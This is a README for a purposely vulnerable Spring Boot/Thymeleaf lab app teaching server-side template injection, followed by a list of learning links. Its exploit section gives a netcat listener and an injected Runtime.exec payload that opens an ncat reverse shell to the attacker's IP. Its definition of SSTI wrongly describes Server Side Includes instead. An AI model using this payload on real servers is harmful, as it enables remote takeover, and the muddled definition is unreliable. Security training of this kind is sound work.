# Java-Thymeleaf-SSTI


simple spring boot app that contains an example of a SSTI vulnerability and its main goal is to describe how a malicious user could exploit it on this purposefully vulnerable app.

## What is Server Side Template Injection ?

SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user.

Owasp : https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection


## Setup

You can start the application with one of these methods
1. Go into the src directory and run these commands :
```
1- ./gradlew build

2- ./gradlew bootRun
```

2. Or simply you can go into the docker directory and run following command:
```
docker-compose up -d
```

3. Or directly run it with docker like this:
```
docker run --name ssti -d -p 8080:8080 siyavash/thymeleaf-ssti
```

Now visit [localhost:8080](http://localhost:8080)


## How To Exploit
After visiting [localhost:8080](http://localhost:8080) you must see a page like this:

![homepage.png](homepage.png)

to test SSTI simply type something like ${7*7} in the input and click join. it will be processed on server and you will see the result which is 49

![49.png](49.png)

Because the application is vulnerable to SSTI we try to achive RCE on the machine. to do this follow these steps:

1. Open a terminal and run following netcat command:
```
nc -v -l 9999
```

2. Now we have netcat listening on port 9999 for any incoming connection , we are going to inject or payload
3. Instead of e-mail paste following payload in the input. remember to replace your IP address with the current one
```
(${T(java.lang.Runtime).getRuntime().exec('ncat -e /bin/sh 192.168.0.192 9999')})
```

4. Here is a video getting reverse shell.

https://user-images.githubusercontent.com/9821568/155853142-8e2a37cc-f16e-4419-bedc-74a3c340e905.mp4



## Fix Hint

https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
   
## Twitter & Facebook Contributor :
   
 https://www.linkedin.com/in/mohammad-hussein-namadi-775baa131/
 
 https://twitter.com/siavashvafshar
    
## Fix 

We encourage you to contribute to Project and Fix Codes

If you want to pull request please follow this :

CONTRIBUTION.md
 
## Awesome Learn & Report

Learn:

https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

https://portswigger.net/web-security/server-side-template-injection

https://workbook.securityboat.in/resources/web-app-pentest/server-side-template-injection-ssti

Tools: https://github.com/epinna/tplmap

https://github.com/epinna/tplmap/blob/master/burp_extension/README.md

Report : 

RCE on Yahoo:  https://gist.github.com/Yas3r/7006ec36ffb987cbfb98

https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf

https://www.youtube.com/watch?v=3cT0uE7Y87s

https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

RCE in Hubspot with EL injection in HubL: https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw

https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9

EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP:	https://owasp.org/www-pdf-archive/Owasp_SSTI_final.pdf

Server Side Template Injection – on the example of Pebble: https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/

Exploring SSTI in Flask/Jinja2, Part II: https://blog.nvisium.com/p255

https://hackerone.com/reports/423541

https://subscription.packtpub.com/book/networking-and-servers/9781788626897/11

https://medium.com/@gandhim373/4-server-side-template-injection-easily-found-d7ca345aa55f

https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md
